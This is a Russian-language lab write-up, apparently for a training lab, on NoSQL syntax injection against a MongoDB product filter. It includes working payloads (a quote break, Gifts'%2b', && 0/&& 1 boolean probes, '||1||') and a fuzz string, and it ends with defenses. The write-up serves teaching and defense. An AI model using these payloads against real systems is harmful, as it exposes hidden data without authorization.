<a id="goal"></a>

## 🎯 Цель

Фильтр товаров по категории работает на MongoDB и уязвим к NoSQL injection. Задача:

```text
Выполнить NoSQL-инъекцию, которая заставит приложение
показать нерелизнутые (unreleased) продукты.
```

---

<a id="theory"></a>

## 🧠 Краткая теория

NoSQL-инъекции бывают двух типов:

```text
1. Syntax injection   — ломаем синтаксис запроса, внедряем свой код
                        (методология похожа на SQLi, синтаксис другой)
2. Operator injection — внедряем операторы запросов ($ne, $gt, $where)
```

MongoDB хранит данные в документах, запросы к ней — JavaScript-подобные выражения:

```javascript
this.category == 'Gifts'
```

Ключевые факты:

```text
- Запрос — это JS-выражение: работают операторы && (И) и || (ИЛИ)
- Пользовательский ввод вставляется в кавычки внутри выражения
- Незакрытая кавычка ломает синтаксис → ошибка JavaScript (часто HTTP 500)
- MongoDB может игнорировать всё после null byte (%00)
```

---

<a id="idea"></a>

## 🧩 Ключевая идея

Пользовательский ввод попадает внутрь строки JS-выражения **без санитизации**. Значит:

```text
Ввод:        Gifts' && 1 && 'x
Запрос:      this.category == 'Gifts' && 1 && 'x'
                                              ↑ кавычка из ввода закрывает контекст
```

Закрыв кавычку и добавив своё выражение, мы дописываем логику запроса. Финальный пейлоад `||1||` добавляет условие «ИЛИ 1» — оно всегда истинно, поэтому фильтр категории перестаёт работать и возвращаются все товары.

---

<a id="methodology"></a>

## 🗺 Методология за 5 шагов

```text
1. Детект        → кавычка ломает запрос (ошибка/изменённый ответ)
2. Подтверждение → валидный JS-конструкт чинит запрос
3. Boolean-тест  → ложное и истинное условия дают разные ответы
4. Эксплуатация  → условие «всегда правда» переопределяет логику
5. Верификация   → в ответе появились данные, скрытые фильтром
```

Это прямой аналог SQLi-методологии (detect → confirm → boolean → exploit), но с JS-синтаксисом.

<a id="step1"></a>

## 🔍 Шаг 1 — Разведка: перехват запроса фильтра

1. Открыть лабу, кликнуть любую категорию (например, Gifts).
2. Burp → Proxy → HTTP history → найти запрос:

```http
GET /filter?category=Gifts HTTP/2
```

3. Правый клик → Send to Repeater.

Серверное выражение (предполагаемое):

```javascript
this.category == 'Gifts'
```

---

<a id="step2"></a>

## 🔍 Шаг 2 — Детект: одиночная кавычка ломает запрос

В Repeater добавить к категории кавычку:

```text
category=Gifts'
```

(выделить `'` и нажать Ctrl+U для URL-кодирования).

Запрос на сервере:

```javascript
this.category == 'Gifts''    ← кавычка без пары → синтаксическая ошибка
```

**Ожидаем:** ошибка JavaScript (в этой лабе — изменённый/ошибочный ответ). Это сигнал, что ввод не фильтруется и попадает в JS-выражение как есть.

---

<a id="step3"></a>

## 🔍 Шаг 3 — Подтверждение: валидный payload чинит запрос

Отправить:

```text
category=Gifts'+
```

после Ctrl+U (важно!):

```http
GET /filter?category=Gifts'%2b' HTTP/2
```

Запрос на сервере:

```javascript
this.category == 'Gifts'+''    ← валидный JS: строки склеились
```

**Ожидаем:** ошибка исчезла, вернулся обычный список товаров Gifts.

**Вывод:** `'` ломает + `'+'` чинит = подтверждённая syntax injection, а не просто «сайт не любит кавычки».

---

<a id="step4"></a>

## 🔍 Шаг 4 — Boolean-тесты: ложь и правда

**Ложное условие:**

```text
category=Gifts' && 0 && 'x
```

```javascript
this.category == 'Gifts' && 0 && 'x'    → 0 = ложь → товаров НЕТ
```

**Истинное условие:**

```text
category=Gifts' && 1 && 'x
```

```javascript
this.category == 'Gifts' && 1 && 'x'    → 1 = правда → товары ЕСТЬ
```

**Ожидаем:** разные ответы на ложь и правду.

**Вывод:** инъекция управляет серверным запросом — можно внедрять произвольную булеву логику.

---

<a id="step5"></a>

## 🔍 Шаг 5 — Эксплуатация: показать всё через `||1||`

Отправить:

```text
category=Gifts'||1||'
```

Запрос на сервере:

```javascript
this.category == 'Gifts'||1||''    → 'Gifts' ИЛИ 1 → всегда правда
```

Условие всегда истинно → фильтр категории перестаёт ограничивать выборку → в ответе **все товары, включая нерелизнутые**.

**Верификация:**

1. Правый клик по ответу → Show response in browser.
2. Скопировать URL, открыть в браузере Burp.
3. В выдаче видны товары без признака released → лаба Solved.

<a id="attack-chain"></a>

## 🧾 Полная цепочка атаки

```text
1. Открыть лабу, кликнуть категорию → GET /filter?category=Gifts в Repeater
2. Gifts' → синтаксическая ошибка (детект)
3. Gifts'+' (Ctrl+U!) → ошибка ушла (подтверждение инъекции)
4. Gifts' && 0 && 'x → пусто; Gifts' && 1 && 'x → товары (boolean-контроль)
5. Gifts'||1||' → все товары, включая unreleased
6. Show response in browser → лаба Solved
```

---

<a id="breakdown"></a>

## 🔬 Почему атака сработала

### 1. Ввод попадает в JS-выражение без санитизации

Сервер конструирует `this.category == '<input>'` конкатенацией строк. Любой введённый синтаксис интерпретируется движком.

### 2. Кавычка — точка выхода из контекста

`'` закрывает строку, дальше атакующий пишет произвольный JS. Успокаивающий ответ на `\'` не потребовался — фильтрация отсутствовала полностью.

### 3. && / || — нативные операторы языка запросов

MongoDB-запрос — это JS, поэтому булева логика внедряется напрямую, без функций вроде UNION, нужных в SQLi.

### 4. `||1||` нейтрализует исходный фильтр

Условие «ИЛИ 1» всегда истинно → критерий категории становится неважным → выборка всех документов коллекции, включая скрытые.

### 5. Ответ раскрывает данные напрямую

Затронутая функция отображает результаты запроса — не слепая инъекция, всё видно в ответе.

<a id="pentester"></a>

## 🧠 Как думать как пентестер

Порядок проверки любого ввода на NoSQL syntax injection:

```text
1. Fuzz-строка:  '"`{\r;$Foo}\n$Foo \xYZ  → изменился ли ответ?
2. Один символ:  ' → ошибка?
3. Починка:      '\' или '+' → ответ нормализовался?
4. Boolean-пара: ' && 0 && 'x  vs  ' && 1 && 'x → разные ответы?
5. Эксплуатация: '||1||' → скрытые данные?
```

Ключевая дисциплина: **каждый спецсимвол URL-кодировать** (Ctrl+U в Burp). `+` в URL = пробел, `&&` и `|` без кодирования ломают сам URL, а не запрос к БД — получишь ложный вывод.

И помнить: «всегда истинное» условие безопасно только в read-контексте. Тот же параметр может использоваться в UPDATE/DELETE — проверять контекст, прежде чем отправлять такой пейлоад в реальную систему.

<a id="mistakes"></a>

## ❌ Типичные ошибки

### Ошибка 1. Не кодировать `+`

`category=Gifts'+'` без кодирования: сервер читает `+` как пробел → `Gifts' ''` → невалидный JS → 500. Правильно: `Gifts'%2b'`. Это главная ловушка данной лабы.

### Ошибка 2. Кавычка перед значением

Пейлоад `'Gifts'+''` добавляет кавычку в начало — она ломает контекст раньше времени → 500. Все кавычки ставятся только после значения.

### Ошибка 3. Не кодировать `&&` и `||`

Необработанные `&` и `|` в URL — разделители параметров и спецсимволы. Запрос ломается на уровне URL, а не БД → ложный вывод «не уязвимо».

### Ошибка 4. Останавливаться после ошибки на шаге 2

Ошибка на `'` — это не «сайт сломался», а сигнал уязвимости. Обязателен шаг 3 (починка), иначе нельзя отличить инъекцию от обычной валидации.

### Ошибка 5. Смотреть только на HTTP-код

Ответ на шаге 5 может быть 200, но главное — содержимое: появились ли unreleased-товары. Верификация по содержимому, а не по статусу.

<a id="defense"></a>

## 🛡 Защита

### 1. Санитизация и валидация ввода

Фильтровать/эскейпить спецсимволы (`'`, `"`, `$`, `{`, `}`, `\`, null byte) перед подстановкой в запрос.

### 2. Параметризованные запросы вместо конкатенации

Использовать драйверные механизмы: фильтры как структуры данных, а не собранные из строк JS-выражения.

```javascript
// плохо: конкатенация строк в $where / expression
// хорошо: структурированный фильтр
collection.find({ category: userInput })
```

### 3. Минимизировать $where и JS-исполнение на сервере

Отказаться от `$where`, `mapReduce` с пользовательскими данными там, где хватает обычных операторов.

### 4. Принцип наименьших привилегий БД

Учётная запись приложения не должна иметь прав на обновление/удаление из read-контекста.

### 5. Единая обработка ввода во всех запросах

Один параметр может использоваться в нескольких запросах (read/update/delete) — санитизация должна быть на входе, а не точечно.

<a id="conclusion"></a>

## 🧾 Итог

Лаборатория решена через **NoSQL syntax injection в MongoDB**:

```text
1. Кавычка ломает JS-выражение запроса       → детект
2. Валидный конструкт ' Gifts'+' ' чинит его → подтверждение
3. Пара && 0 / && 1 доказывает контроль логики
4. ||1|| переопределяет фильтр               → все товары, включая unreleased
```

Главные выводы:

```text
NoSQL syntax injection = SQLi-методология на другом синтаксисе: detect → confirm → boolean → exploit.
```

```text
URL-кодирование — часть пейлоада: + это пробел, && и | ломают URL до БД.
```

```text
«Всегда истинное» условие переопределяет любые фильтры — но безопасно только в read-контексте.
```

```text
Защита: структурированные фильтры вместо конкатенации, санитизация на входе, отказ от $where.
```
